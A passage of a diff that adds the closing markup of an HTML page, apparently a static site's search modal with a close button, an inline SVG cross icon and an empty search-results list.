+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
